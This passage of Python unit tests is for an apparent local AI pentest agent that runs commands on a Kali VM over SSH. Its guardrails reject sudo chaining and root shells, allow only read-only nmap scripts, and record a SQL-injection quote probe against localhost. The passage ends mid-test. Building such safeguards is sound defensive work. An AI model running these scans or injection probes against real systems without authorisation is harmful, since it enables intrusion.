        channel.recv_stderr_ready.return_value = False
        channel.exit_status_ready.return_value = True
        channel.recv_exit_status.return_value = 0
        transport = Mock()
        transport.is_active.return_value = True
        transport.open_session.return_value = channel
        client = Mock()
        client.get_transport.return_value = transport
        runner = kali_access.KaliAccess()
        runner.sudo_mode = True
        runner._sudo_password = bytearray(b"session-pass")
        with (patch.object(runner, "connect", return_value=client),
              contextlib.redirect_stdout(io.StringIO())):
            result = runner.run("id -u")

        remote_command = channel.exec_command.call_args.args[0]
        remote_script = shlex.split(remote_command)[-1]
        self.assertIn("sudo -S -p '' -- bash -o pipefail -c", remote_script)
        self.assertIn("exec </dev/null && id -u", remote_script)
        self.assertNotIn("session-pass", remote_command)
        self.assertEqual(bytes(channel.sendall.call_args.args[0]), b"session-pass\n")
        self.assertEqual(runner.last_record["privilege_mode"], "sudo_session")
        self.assertTrue(runner.last_record["sudo_access_validated"])
        self.assertTrue(runner.last_record["sudo_password_sent"])
        self.assertFalse(runner.last_record["sudo_password_prompted"])
        self.assertTrue(runner.sudo_mode)
        self.assertIn("[exit 0;", result)

    def test_explicit_sudo_command_reuses_the_session_password(self):
        channel = Mock()
        channel.recv_ready.return_value = False
        channel.recv_stderr_ready.return_value = False
        channel.exit_status_ready.return_value = True
        channel.recv_exit_status.return_value = 0
        transport = Mock()
        transport.is_active.return_value = True
        transport.open_session.return_value = channel
        client = Mock()
        client.get_transport.return_value = transport
        runner = kali_access.KaliAccess()
        runner.sudo_mode = True
        runner._sudo_password = bytearray(b"session-pass")
        with (patch.object(runner, "connect", return_value=client),
              patch.object(kali_access.getpass, "getpass") as prompt,
              contextlib.redirect_stdout(io.StringIO())):
            runner.run("sudo id -u")

        prompt.assert_not_called()
        self.assertEqual(bytes(channel.sendall.call_args.args[0]), b"session-pass\n")
        self.assertEqual(runner.last_record["privilege_mode"], "sudo")
        self.assertTrue(runner.sudo_mode)

    def test_expired_session_sudo_mode_fails_closed_and_disables_mode(self):
        class Channel:
            def __init__(self):
                self.stderr_pending = [b"sudo: a password is required\n"]

            def exec_command(self, command):
                self.command = command

            def shutdown_write(self):
                pass

            def sendall(self, _data):
                pass

            def recv_ready(self):
                return False

            def recv(self, _size):
                return b""

            def recv_stderr_ready(self):
                return bool(self.stderr_pending)

            def recv_stderr(self, _size):
                return self.stderr_pending.pop(0)

            def exit_status_ready(self):
                return not self.stderr_pending

            def recv_exit_status(self):
                return 1

            def close(self):
                pass

        channel = Channel()
        transport = Mock()
        transport.is_active.return_value = True
        transport.open_session.return_value = channel
        client = Mock()
        client.get_transport.return_value = transport
        runner = kali_access.KaliAccess()
        runner.sudo_mode = True
        runner._sudo_password = bytearray(b"expired-pass")
        with (patch.object(runner, "connect", return_value=client),
              contextlib.redirect_stdout(io.StringIO())):
            result = runner.run("id -u")

        self.assertIn("sudo -S -p '' -- bash", shlex.split(channel.command)[-1])
        self.assertFalse(runner.sudo_mode)
        self.assertIsNone(runner._sudo_password)
        self.assertFalse(runner.last_record["sudo_access_validated"])
        self.assertIn("password is required", result)

    def test_user_exit_wipes_cached_sudo_password(self):
        runner = kali_access.KaliAccess()
        old_password = bytearray(b"secret-pass")
        runner._sudo_password = old_password
        runner.sudo_mode = True
        runner.clear_sudo_mode()

        self.assertFalse(runner.sudo_mode)
        self.assertIsNone(runner._sudo_password)
        self.assertEqual(old_password, bytearray(len(b"secret-pass")))

    def test_sudo_parser_rejects_options_chaining_and_interactive_shells(self):
        self.assertIsNone(kali_access.sudo_command_parts("hostname"))
        self.assertEqual(kali_access.sudo_command_parts("sudo"), [])
        self.assertEqual(kali_access.sudo_command_parts("sudo id -u"), ["id", "-u"])
        with self.assertRaisesRegex(ValueError, "Use `sudo` directly"):
            kali_access.sudo_command_parts("/sudo")
        for command in (
            "id; sudo whoami",
            "sudo id | cat",
            "sudo -n id",
            "sudo su",
            "sudo -i",
            "sudo id > /tmp/result",
        ):
            with self.subTest(command=command), self.assertRaises(ValueError):
                kali_access.sudo_command_parts(command)

    def test_invalid_commands_are_rejected_before_connecting(self):
        runner = kali_access.KaliAccess()
        with patch.object(runner, "connect") as connect:
            for command in ("  ", "x" * 64001, "echo a\x00b"):
                with self.subTest(length=len(command)), self.assertRaises(ValueError):
                    runner.run(command)
            connect.assert_not_called()

    def test_modes_keep_separate_history(self):
        kali, calls, _ = self._run_chat(
            ["hello", "/shell", "ip a", "/chat", "hello again"],
            [{"content": "Hello.", "tool_calls": []},
             {"content": "Kali has an IP.", "tool_calls": []},
             {"content": "Hello again.", "tool_calls": []}],
            shell=False,
        )
        kali.run.assert_called_once_with("ip a")
        self.assertEqual([item[0] for item in calls], [False, False, False])
        self.assertIn("no Kali tools", calls[0][2][0]["content"])
        self.assertIn("no tools in this turn", calls[1][2][0]["content"])
        self.assertEqual([item["role"] for item in calls[2][2]], ["system", "user", "assistant", "user"])

    def test_streaming_native_call_is_assembled(self):
        events = [
            {"choices": [{"delta": {"tool_calls": [{"index": 0, "id": "call_1", "function": {"name": "run_kali_command", "arguments": '{"command":"ip'}}]}}]},
            {"choices": [{"delta": {"tool_calls": [{"index": 0, "function": {"arguments": ' a"}'}}]}, "finish_reason": "tool_calls"}]},
        ]
        stream = io.BytesIO(b"".join(b"data: " + json.dumps(event).encode() + b"\n\n" for event in events))
        reply = deep_agent._normalize_reply(deep_agent._streamed_reply(stream))
        self.assertEqual(deep_agent._tool_command(reply)[0], "ip a")

    def test_stream_usage_arrives_after_finish_reason(self):
        events = [
            {"choices": [{"delta": {"content": "Done"}, "finish_reason": None}]},
            {"choices": [{"delta": {}, "finish_reason": "stop"}]},
            {"choices": [], "usage": {"prompt_tokens": 1100, "completion_tokens": 20, "total_tokens": 1120}},
        ]
        stream = io.BytesIO(b"".join(b"data: " + json.dumps(event).encode() + b"\n\n" for event in events)
                            + b"data: [DONE]\n\n")
        result = deep_agent._normalize_reply(deep_agent._streamed_reply(stream))
        self.assertEqual(result["content"], "Done")
        self.assertEqual(result["usage"]["prompt_tokens"], 1100)

    def test_context_indicator_uses_server_limit_and_reports_unknowns(self):
        with patch.object(deep_agent, "CONTEXT_STATUS", {"chat": (1000, 24), "shell": None}):
            with patch.object(deep_agent, "_context_limit", return_value=32768):
                self.assertIn("1,024/32,768 tokens (3.1%)", deep_agent._context_indicator("chat"))
            self.assertIn("usage unavailable", deep_agent._context_indicator("shell"))
            with patch.object(deep_agent, "_context_limit", return_value=None):
                self.assertIn("server limit unavailable", deep_agent._context_indicator("chat"))

    def test_context_limit_reads_llama_props(self):
        response = io.BytesIO(json.dumps({"default_generation_settings": {"n_ctx": 262144}}).encode())
        with (patch.object(deep_agent, "BACKEND", "llama"),
              patch.object(deep_agent, "BASE_URL", "http://127.0.0.1:8080/v1"),
              patch.object(deep_agent, "CONTEXT_LIMIT", None),
              patch.object(deep_agent.urllib.request, "urlopen", return_value=response) as open_url):
            self.assertEqual(deep_agent._context_limit(), 262144)
            self.assertEqual(open_url.call_args.args[0], "http://127.0.0.1:8080/props")

    def test_context_limit_reads_loaded_ollama_model(self):
        response = io.BytesIO(json.dumps({"models": [
            {"name": "other", "context_length": 4096},
            {"name": "qwen3.8:27b", "context_length": 32768},
        ]}).encode())
        with (patch.object(deep_agent, "BACKEND", "ollama"),
              patch.object(deep_agent, "MODEL", "qwen3.8:27b"),
              patch.object(deep_agent, "CONTEXT_LIMIT", None),
              patch.object(deep_agent.urllib.request, "urlopen", return_value=response)):
            self.assertEqual(deep_agent._context_limit(), 32768)

    def test_context_limit_uses_configured_ollama_context_when_unloaded(self):
        response = io.BytesIO(json.dumps({"models": []}).encode())
        with (patch.object(deep_agent, "BACKEND", "ollama"),
              patch.object(deep_agent, "CONTEXT_LIMIT", None),
              patch.dict(os.environ, {"DEEP_AGENT_OLLAMA_NUM_CTX": "32768"}),
              patch.object(deep_agent.urllib.request, "urlopen", return_value=response)):
            self.assertEqual(deep_agent._context_limit(), 32768)

    def test_context_command_shows_indicator_without_model_call(self):
        kali, calls, output = self._run_chat(["/context"], [])
        kali.run.assert_not_called()
        self.assertEqual(calls, [])
        self.assertIn("Context:", output)

    def test_text_tool_array_and_ifm_format_are_accepted(self):
        forms = [
            '<tool_call>[{"name":"run_vm_command","arguments":{"command":"whoami"}}]</tool_call>',
            '<ifm|tool_calls><ifm|tool_call>run_kali_command<ifm|arg_key>command</ifm|arg_key><ifm|arg_value>whoami</ifm|arg_value></ifm|tool_call></ifm|tool_calls>',
        ]
        for value in forms:
            with self.subTest(value=value[:16]):
                reply = deep_agent._normalize_reply({"content": value, "tool_calls": []})
                self.assertEqual(deep_agent._tool_command(reply)[0], "whoami")

    def test_llama_request_offers_tool_and_reads_native_call(self):
        event = {"choices": [{"delta": {"tool_calls": [{"index": 0, "id": "call_1", "function": {
            "name": "run_kali_command", "arguments": '{"command":"whoami"}'}}]}, "finish_reason": "tool_calls"}]}

        class Response:
            headers = {"Content-Type": "text/event-stream"}

            def __enter__(self):
                return self

            def __exit__(self, *_):
                return False

            def __iter__(self):
                yield b"data: " + json.dumps(event).encode() + b"\n\n"

        for model in ("bonsai-2-27b", "k2-horizon", "other-local-model"):
            with (self.subTest(model=model), patch.object(deep_agent, "MODEL", model),
                  patch.object(deep_agent.urllib.request, "urlopen", return_value=Response()) as open_url):
                reply = deep_agent._llama_chat([{"role": "user", "content": "whoami"}], tools=True, stream_output=False)
                sent = json.loads(open_url.call_args.args[0].data)
                self.assertEqual(sent["tools"][0]["function"]["name"], "run_kali_command")
                self.assertEqual(sent["stream_options"], {"include_usage": True})
                self.assertFalse(sent["parallel_tool_calls"])
                self.assertEqual(deep_agent._tool_command(reply)[0], "whoami")
                if model == "bonsai-2-27b":
                    self.assertEqual(sent["chat_template_kwargs"], {"reasoning_effort": "medium"})
                    self.assertEqual(sent["max_tokens"], 8192)
                    self.assertEqual(sent["top_k"], 20)
                    self.assertEqual(sent["min_p"], 0.05)
                    self.assertEqual(sent["presence_penalty"], 0.0)
                elif model == "k2-horizon":
                    self.assertEqual(sent["chat_template_kwargs"], {"reasoning_effort": "medium"})
                    deep_agent.REASONING_OVERRIDE["effort"] = "high"
                    reply = deep_agent._llama_chat([{"role": "user", "content": "whoami"}], tools=True, stream_output=False)
                    sent = json.loads(open_url.call_args.args[0].data)
                    self.assertEqual(sent["chat_template_kwargs"], {"reasoning_effort": "high"})
                    deep_agent.REASONING_OVERRIDE["effort"] = None
                else:
                    self.assertNotIn("chat_template_kwargs", sent)
                    with patch.dict(os.environ, {"DEEP_AGENT_THINKING": "off"}):
                        reply = deep_agent._llama_chat([{"role": "user", "content": "whoami"}], tools=True, stream_output=False)
                        sent = json.loads(open_url.call_args.args[0].data)
                        self.assertEqual(sent["chat_template_kwargs"], {"enable_thinking": False})

    def test_ollama_request_offers_tool_and_reads_native_call(self):
        response = io.BytesIO(json.dumps({"message": {"content": "", "tool_calls": [
            {"function": {"name": "run_kali_command", "arguments": {"command": "whoami"}}}]},
            "prompt_eval_count": 12, "eval_count": 5}).encode())
        with (patch.object(deep_agent.urllib.request, "urlopen", return_value=response) as open_url,
              patch.dict(os.environ, {"DEEP_AGENT_OLLAMA_NUM_CTX": "32768", "DEEP_AGENT_OLLAMA_THINK": "xhigh"})):
            reply = deep_agent._ollama_chat([{"role": "user", "content": "whoami"}], tools=True, stream_output=False)
        sent = json.loads(open_url.call_args.args[0].data)
        self.assertEqual(sent["tools"][0]["function"]["name"], "run_kali_command")
        self.assertEqual(sent["options"], {"num_ctx": 32768})
        self.assertEqual(sent["think"], "xhigh")
        self.assertEqual(open_url.call_args.args[0].full_url, "http://127.0.0.1:11434/api/chat")
        self.assertEqual(deep_agent._tool_command(reply)[0], "whoami")

    def test_ollama_request_converts_historical_tool_arguments_to_object(self):
        tool_call = deep_agent._make_tool_call("run_kali_command", {"command": "hostname -I"})
        messages = [
            {"role": "assistant", "content": "", "tool_calls": [tool_call]},
            {"role": "tool", "tool_call_id": tool_call["id"], "tool_name": "run_kali_command", "content": "10.0.2.15"},
        ]
        response = io.BytesIO(json.dumps({"message": {"content": "The Kali IP is 10.0.2.15.", "tool_calls": []},
                                           "prompt_eval_count": 30, "eval_count": 8}).encode())
        with patch.object(deep_agent.urllib.request, "urlopen", return_value=response) as open_url:
            deep_agent._ollama_chat(messages, tools=True, stream_output=False)
        sent = json.loads(open_url.call_args.args[0].data)
        sent_call = sent["messages"][0]["tool_calls"][0]
        self.assertEqual(sent_call["function"]["arguments"], {"command": "hostname -I"})
        self.assertIsInstance(messages[0]["tool_calls"][0]["function"]["arguments"], str)

    def test_kali_output_stays_live_after_model_capture_limit(self):
        class Channel:
            def __init__(self):
                self.pending = [b"helloworld"]

            def exec_command(self, command):
                self.command = command

            def shutdown_write(self):
                pass

            def recv_ready(self):
                return bool(self.pending)

            def recv(self, _size):
                return self.pending.pop(0)

            def recv_stderr_ready(self):
                return False

            def recv_stderr(self, _size):
                return b""

            def exit_status_ready(self):
                return not self.pending

            def recv_exit_status(self):
                return 0

            def close(self):
                pass

        channel = Channel()
        transport = Mock()
        transport.is_active.return_value = True
        transport.open_session.return_value = channel
        client = Mock()
        client.get_transport.return_value = transport
        runner = kali_access.KaliAccess()
        output = io.StringIO()
        with (patch.object(runner, "connect", return_value=client),
              patch.object(kali_access, "OUTPUT_LIMIT", 5),
              contextlib.redirect_stdout(output)):
            result = runner.run("printf helloworld")
        self.assertIn("helloworld", output.getvalue())
        self.assertIn("bash -o pipefail -c", channel.command)
        self.assertIn("hello", result)
        self.assertNotIn("helloworld", result)
        self.assertIn("INCOMPLETE", result)


class StreamingDisplayTests(unittest.TestCase):
    def test_llama_thinking_and_answer_are_visible_before_stream_finishes(self):
        output = io.StringIO()

        class Response:
            headers = {"Content-Type": "text/event-stream"}

            def __enter__(self):
                return self

            def __exit__(self, *_):
                return False

            def __iter__(self):
                chunks = [
                    {"choices": [{"delta": {"reasoning_content": "Add two and two."}}]},
                    {"choices": [{"delta": {"content": "4"}}]},
                    {"choices": [{"delta": {}, "finish_reason": "stop"}]},
                    {"choices": [], "usage": {"prompt_tokens": 15, "completion_tokens": 8}},
                ]
                for index, chunk in enumerate(chunks):
                    if index == 1:
                        self_test.assertIn("[thinking]> Add two and two.", output.getvalue())
                    if index == 2:
                        self_test.assertIn("Test Qwen> 4", output.getvalue())
                    yield b"data: " + json.dumps(chunk).encode() + b"\n"
                    yield b"\n"
                yield b"data: [DONE]\n"
                yield b"\n"

        self_test = self
        messages = [{"role": "user", "content": "2+2?"}]
        with (patch.object(deep_agent, "ASSISTANT_NAME", "Test Qwen"),
              patch.object(deep_agent, "MODEL", "agent-27b"),
              patch.object(deep_agent, "REASONING_OVERRIDE", {"sticky": "high", "effort": None}),
              patch.object(deep_agent.urllib.request, "urlopen", return_value=Response()) as open_url,
              contextlib.redirect_stdout(output)):
            reply = deep_agent._llama_chat(messages)
        sent = json.loads(open_url.call_args.args[0].data)
        self.assertTrue(sent["chat_template_kwargs"]["enable_thinking"])
        self.assertEqual(sent["reasoning_format"], "deepseek")
        self.assertEqual(reply["content"], "4")
        self.assertNotIn("reasoning_content", reply)
        self.assertEqual(messages, [{"role": "user", "content": "2+2?"}])
        self.assertEqual(output.getvalue().count("Test Qwen> 4"), 1)
        self.assertIn("8 model tokens", output.getvalue())

    def test_shell_stream_labels_drafts_and_holds_partial_tool_arguments(self):
        output = io.StringIO()
        chunks = [
            {"choices": [{"delta": {"reasoning_content": "Check the local address."}}]},
            {"choices": [{"delta": {"content": "I will check the address."}}]},
            {"choices": [{"delta": {"tool_calls": [{"index": 0, "id": "call_1", "function": {
                "name": "run_kali_command", "arguments": '{"command":"hostname'}}]}}]},
            {"choices": [{"delta": {"tool_calls": [{"index": 0, "function": {
                "arguments": ' -I"}'}}]}, "finish_reason": "tool_calls"}]},
        ]
        response = io.BytesIO(b"".join(b"data: " + json.dumps(chunk).encode() + b"\n\n" for chunk in chunks))
        with contextlib.redirect_stdout(output), deep_agent.LiveGeneration(False) as live:
            reply = deep_agent._normalize_reply(deep_agent._streamed_reply(response, live))
            live.finish(reply)
        self.assertEqual(deep_agent._tool_command(reply)[0], "hostname -I")
        self.assertIn("live draft; pending controller checks", output.getvalue())
        self.assertIn("command has not run yet", output.getvalue())
        self.assertNotIn("hostname", output.getvalue())
        self.assertNotIn('"arguments"', output.getvalue())

    def test_ollama_streams_thinking_content_and_preserves_usage(self):
        output = io.StringIO()
        self_test = self

        class Response:
            headers = {"Content-Type": "application/x-ndjson"}

            def __enter__(self):
                return self

            def __exit__(self, *_):
                return False

            def __iter__(self):
                chunks = [
                    {"message": {"thinking": "Use addition.", "content": ""}, "done": False},
                    {"message": {"content": "Four."}, "done": False},
                    {"message": {"content": ""}, "done": True, "prompt_eval_count": 20, "eval_count": 9},
                ]
                for index, chunk in enumerate(chunks):
                    if index == 1:
                        self_test.assertIn("Use addition.", output.getvalue())
                    if index == 2:
                        self_test.assertIn("> Four.", output.getvalue())
                    yield json.dumps(chunk).encode() + b"\n"

        with (patch.object(deep_agent.urllib.request, "urlopen", return_value=Response()) as open_url,
              contextlib.redirect_stdout(output)):
            reply = deep_agent._ollama_chat([{"role": "user", "content": "2+2?"}])
        self.assertTrue(json.loads(open_url.call_args.args[0].data)["stream"])
        self.assertEqual(reply["content"], "Four.")
        self.assertEqual(reply["usage"], {"prompt_tokens": 20, "completion_tokens": 9})
        self.assertNotIn("thinking", reply)

    def test_ollama_stream_assembles_native_tool_call_after_thinking(self):
        chunks = [
            {"message": {"thinking": "Check the hostname."}, "done": False},
            {"message": {"tool_calls": [{"function": {"name": "run_kali_command",
                "arguments": {"command": "hostname"}}}]}, "done": False},
            {"message": {"content": ""}, "done": True, "eval_count": 10},
        ]
        response = io.BytesIO(b"".join(json.dumps(chunk).encode() + b"\n" for chunk in chunks))
        response.headers = {"Content-Type": "application/x-ndjson"}
        output = io.StringIO()
        with (patch.object(deep_agent.urllib.request, "urlopen", return_value=response),
              contextlib.redirect_stdout(output)):
            reply = deep_agent._ollama_chat([{"role": "user", "content": "hostname?"}], tools=True, stream_output=False)
        self.assertEqual(deep_agent._tool_command(reply)[0], "hostname")
        self.assertEqual(reply["content"], "")
        self.assertIn("command has not run yet", output.getvalue())
        self.assertNotIn('"command"', output.getvalue())

    def test_partial_ollama_stream_fails_and_closes_live_status(self):
        response = io.BytesIO(json.dumps({"message": {"thinking": "Still considering."}, "done": False}).encode() + b"\n")
        response.headers = {"Content-Type": "application/x-ndjson"}
        output = io.StringIO()
        with (patch.object(deep_agent.urllib.request, "urlopen", return_value=response),
              contextlib.redirect_stdout(output), self.assertRaisesRegex(ValueError, "Incomplete streaming")):
            deep_agent._ollama_chat([{"role": "user", "content": "Hello"}])
        self.assertIn("Generation stopped", output.getvalue())
        self.assertNotIn("Generation complete", output.getvalue())

    def test_reasoning_off_shows_only_answer_and_keeps_request_local(self):
        response = io.BytesIO(json.dumps({"choices": [{"message": {"content": "Hi"}}]}).encode())
        response.headers = {"Content-Type": "application/json"}
        output = io.StringIO()
        with (patch.object(deep_agent, "MODEL", "agent-27b"),
              patch.object(deep_agent, "REASONING_OVERRIDE", {"sticky": "off", "effort": None}),
              patch.object(deep_agent.urllib.request, "urlopen", return_value=response) as open_url,
              contextlib.redirect_stdout(output)):
            reply = deep_agent._llama_chat([{"role": "user", "content": "Hello"}])
        self.assertFalse(json.loads(open_url.call_args.args[0].data)["chat_template_kwargs"]["enable_thinking"])
        self.assertEqual(reply["content"], "Hi")
        self.assertNotIn("[thinking]", output.getvalue())


class LocalModelResilienceTests(unittest.TestCase):
    def test_llama_reports_skip_thinking_without_changing_high_tool_reasoning(self):
        sent = []

        def respond(request, **_):
            sent.append(json.loads(request.data))
            response = io.BytesIO(json.dumps({"choices": [{"message": {"content": "Recorded result."}}]}).encode())
            response.headers = {"Content-Type": "application/json"}
            return response

        setting = {"effort": None, "sticky": "high"}
        report = [{"role": "system", "content": deep_agent.SUMMARY_SYSTEM_PROMPT},
                  {"role": "user", "content": "Explain the recorded command error."}]
        action = [{"role": "system", "content": deep_agent.SHELL_SYSTEM_PROMPT},
                  {"role": "user", "content": "find all websites I have hosted here"}]
        with (patch.object(deep_agent, "MODEL", "agent-27b"),
              patch.object(deep_agent, "REASONING_OVERRIDE", setting),
              patch.object(deep_agent.urllib.request, "urlopen", side_effect=respond),
              contextlib.redirect_stdout(io.StringIO())):
            deep_agent._llama_chat(report, tools=False, stream_output=False)
            deep_agent._llama_chat(action, tools=True, stream_output=False)
            deep_agent._llama_chat([{"role": "user", "content": "Explain a difficult concept."}], tools=False)
        self.assertEqual([request["chat_template_kwargs"]["enable_thinking"] for request in sent], [False, True, True])
        self.assertEqual([(request["temperature"], request["top_p"], request["presence_penalty"])
                          for request in sent], [(1.0, 0.95, 0.0)] * 3)
        self.assertEqual([request["reasoning_budget_tokens"] for request in sent], [0, 2048, 8192])
        self.assertTrue(all(request["max_tokens"] == 32768 for request in sent))
        self.assertTrue(all("reasoning_budget" not in request for request in sent))
        self.assertIn("tools", sent[1])
        self.assertEqual(setting, {"effort": None, "sticky": "high"})

    def test_ollama_reports_skip_thinking_without_changing_high_tool_reasoning(self):
        sent = []

        def respond(request, **_):
            sent.append(json.loads(request.data))
            return io.BytesIO(json.dumps({"message": {"content": "Recorded result."}}).encode())

        setting = {"effort": None, "sticky": "high"}
        with (patch.object(deep_agent, "MODEL", "qwen3.8:27b"),
              patch.object(deep_agent, "REASONING_OVERRIDE", setting),
              patch.object(deep_agent.urllib.request, "urlopen", side_effect=respond),
              contextlib.redirect_stdout(io.StringIO())):
            deep_agent._ollama_chat([
                {"role": "system", "content": deep_agent.SUMMARY_SYSTEM_PROMPT},
                {"role": "user", "content": "Explain the recorded result."},
            ], tools=False, stream_output=False)
            deep_agent._ollama_chat([
                {"role": "system", "content": deep_agent.SHELL_SYSTEM_PROMPT},
                {"role": "user", "content": "find all websites I have hosted here"},
            ], tools=True, stream_output=False)
        self.assertEqual([request["think"] for request in sent], [False, True])
        self.assertEqual(setting, {"effort": None, "sticky": "high"})

    def test_k2_reasoning_effort_defaults_medium_and_escalates_on_request(self):
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("DEEP_AGENT_K2_REASONING", None)
            self.assertEqual(deep_agent._k2_reasoning_effort(), "medium")
            deep_agent.REASONING_OVERRIDE["effort"] = "high"
            self.assertEqual(deep_agent._k2_reasoning_effort(), "high")
            os.environ["DEEP_AGENT_K2_REASONING"] = "low"
            self.assertEqual(deep_agent._k2_reasoning_effort(), "high")
            deep_agent.REASONING_OVERRIDE["effort"] = None
            self.assertEqual(deep_agent._k2_reasoning_effort(), "low")
            del os.environ["DEEP_AGENT_K2_REASONING"]
            os.environ["DEEP_AGENT_K2_REASONING"] = "nonsense"
            self.assertEqual(deep_agent._k2_reasoning_effort(), "medium")
            deep_agent.REASONING_OVERRIDE["effort"] = None

    def test_reasoning_escalation_phrases_are_selective(self):
        for phrase in ("think harder about this one", "use high effort here",
                       "think it through carefully", "take your time on this",
                       "deep think: find the attack path"):
            with self.subTest(phrase=phrase):
                self.assertTrue(deep_agent.REASONING_ESCALATION.search(phrase))
        for phrase in ("check ports on the target", "scan 192.168.1.5",
                       "what were the results?"):
            with self.subTest(phrase=phrase):
                self.assertFalse(deep_agent.REASONING_ESCALATION.search(phrase))

    def test_reasoning_commands_control_qwen_requests_across_modes(self):
        sent = []

        def respond(request, **kwargs):
            sent.append(json.loads(request.data))
            response = io.BytesIO(json.dumps({
                "choices": [{"message": {"content": "Hello.", "tool_calls": []}}],
            }).encode())
            response.headers = {"Content-Type": "application/json"}
            return response

        kali = Mock(sudo_mode=False)
        output = io.StringIO()
        inputs = ["reasoning:high", "Hello", "/shell", "/reasoning", "/chat",
                  "Hello again", "reasoning: medium", "Hello at medium",
                  "/shell", "/reasoning low", "/chat", "Hello at low",
                  "/shell", "reasoning: off", "/chat",
                  "Think harder about addition", "reasoning:invalid", "exit"]
        with (patch.object(deep_agent, "BACKEND", "llama"),
              patch.object(deep_agent, "MODEL", "agent-27b"),
              patch.object(deep_agent, "REASONING_OVERRIDE", {"effort": None, "sticky": None}),
              patch.object(deep_agent, "_context_limit", return_value=65536),
              patch.dict(os.environ, {"DEEP_AGENT_THINKING": "off"}),
              patch("kali_access.KaliAccess", return_value=kali),
              patch("builtins.input", side_effect=inputs),
              patch.object(deep_agent.urllib.request, "urlopen", side_effect=respond),
              contextlib.redirect_stdout(output)):
            deep_agent.chat_loop()
        self.assertEqual(len(sent), 5)
        self.assertEqual([request["chat_template_kwargs"] for request in sent], [
            {"enable_thinking": True, "reasoning_effort": "xhigh"},
            {"enable_thinking": True, "reasoning_effort": "xhigh"},
            {"enable_thinking": True, "reasoning_effort": "medium"},
            {"enable_thinking": True, "reasoning_effort": "low"},
            {"enable_thinking": False},
        ])
        self.assertEqual([(request["temperature"], request["top_p"], request["presence_penalty"])
                          for request in sent], [(1.0, 0.95, 0.0)] * 5)
        self.assertEqual([request["reasoning_budget_tokens"] for request in sent], [8192] * 4 + [0])
        for request in sent:
            self.assertEqual(request["max_tokens"], 32768)
            self.assertEqual(request["top_k"], 20)
            self.assertEqual(request["min_p"], 0.0)
            self.assertEqual(request["repeat_penalty"], 1.0)
            self.assertEqual(request["frequency_penalty"], 0.0)
            self.assertEqual(request["dry_multiplier"], 0.0)
            self.assertEqual(request["xtc_probability"], 0.0)
            self.assertEqual(request["mirostat"], 0)
        self.assertTrue(all("reasoning:" not in message.get("content", "").lower()
                            for request in sent for message in request["messages"]))
        self.assertIn("Reasoning setting: high", output.getvalue())
        self.assertIn("Reasoning set to off", output.getvalue())
        self.assertNotIn("High reasoning requested for this turn", output.getvalue())
        kali.run.assert_not_called()

    def test_xxs_sampling_stays_fixed_across_defaults_and_keeps_other_models_independent(self):
        cases = [
            ("agent-27b", "off", (1.0, 0.95, 0.0)),
            ("agent-27b", "on", (1.0, 0.95, 0.0)),
            ("agent-27b", "", (1.0, 0.95, 0.0)),
            ("qwen3.8-q4ks-test", "off", None),
            ("other-local-model", "off", None),
        ]
        for model, default, profile in cases:
            with self.subTest(model=model, default=default):
                response = io.BytesIO(json.dumps({"choices": [{"message": {"content": "Hello."}}]}).encode())
                response.headers = {"Content-Type": "application/json"}
                with (patch.object(deep_agent, "MODEL", model),
                      patch.object(deep_agent, "REASONING_OVERRIDE", {"effort": None, "sticky": None}),
                      patch.dict(os.environ, {"DEEP_AGENT_THINKING": default}),
                      patch.object(deep_agent.urllib.request, "urlopen", return_value=response) as open_url,
                      contextlib.redirect_stdout(io.StringIO())):
                    deep_agent._llama_chat([{"role": "user", "content": "Hello"}], stream_output=False)
                request = json.loads(open_url.call_args.args[0].data)
                if profile is not None:
                    self.assertEqual((request["temperature"], request["top_p"], request["presence_penalty"]), profile)
                    self.assertEqual(request["reasoning_budget_tokens"], 0 if default == "off" else 8192)
                else:
                    self.assertEqual((request["temperature"], request["top_p"]), (1.0, 0.95))
                    self.assertNotIn("presence_penalty", request)
                    self.assertNotIn("min_p", request)
                    self.assertNotIn("reasoning_budget_tokens", request)

    def test_reasoning_override_controls_ollama_thinking(self):
        for setting, expected in (("high", True), ("off", False)):
            response = io.BytesIO(json.dumps({"message": {"content": "Hello."}}).encode())
            with (self.subTest(setting=setting),
                  patch.object(deep_agent, "MODEL", "qwen3.8:27b"),
                  patch.object(deep_agent, "REASONING_OVERRIDE", {"effort": None, "sticky": setting}),
                  patch.dict(os.environ, {"DEEP_AGENT_OLLAMA_THINK": "false"}),
                  patch.object(deep_agent.urllib.request, "urlopen", return_value=response) as open_url):
                deep_agent._ollama_chat([{"role": "user", "content": "Hello"}], stream_output=False)
                self.assertEqual(json.loads(open_url.call_args.args[0].data)["think"], expected)

    def test_html_bodies_are_bounded_but_headers_and_tail_survive(self):
        page = ("HTTP/1.1 200 OK\nServer: nginx\n\n<!DOCTYPE html>\n<html><head>"
                "<title>Tic Tac Toe</title></head><body><p>" + "x" * 9000 + "</p>"
                "<script>win()</script></body></html>")
        bounded = deep_agent._bound_html_body(page)
        self.assertIn("HTTP/1.1 200 OK", bounded)
        self.assertIn("Tic Tac Toe", bounded)
        self.assertIn("win()", bounded)
        self.assertIn("truncated from model context", bounded)
        self.assertLess(len(bounded), 4000)
        self.assertEqual(deep_agent._bound_html_body("plain output"), "plain output")

    def test_filesystem_wide_find_without_maxdepth_is_rejected_and_scoped_find_passes(self):
        issue = deep_agent._unbounded_search_issue(
            "find / -name 'tic-tac-toe*' -o -name 'tictactoe*' 2>/dev/null | grep -v proc")
        self.assertIn("-maxdepth", issue)
        self.assertIsNone(deep_agent._unbounded_search_issue(
            "find /var/www /srv -maxdepth 4 -name '*.html'"))
        self.assertIsNone(deep_agent._unbounded_search_issue("ls /"))

    def test_safe_nse_scripts_allowlisted_and_unsafe_rejected(self):
        safe = deep_agent._scoped_nmap_issue(
            "nmap -n -sT -sV -p 80,443 --host-timeout 45s "
            "--script http-title,http-server-header 192.168.56.101")
        self.assertIsNone(safe)
        unsafe = deep_agent._scoped_nmap_issue(
            "nmap -n -sT -sV -p 80 --host-timeout 45s --script vuln 192.168.56.101")
        self.assertIn("only read-only scripts", unsafe)
        self.assertTrue(deep_agent._nse_scripts_allowlisted(
            ["nmap", "--script=http-methods,ssl-cert", "127.0.0.1"]))
        self.assertIsNone(deep_agent._nse_scripts_allowlisted(["nmap", "-p", "80"]))

    def test_sql_error_signature_is_recorded_only_with_quoted_probe(self):
        ledger = deep_agent.EvidenceLedger()
        probe = ledger.record_command({
            "command": "curl -sS 'http://127.0.0.1/test.php?id=1%27'",
            "execution_state": "completed", "exit_code": 0,
            "stdout": "<b>Warning</b>: You have an error in your SQL syntax near ''",
            "stderr": "", "timed_out": False, "output_truncated": False,
        })
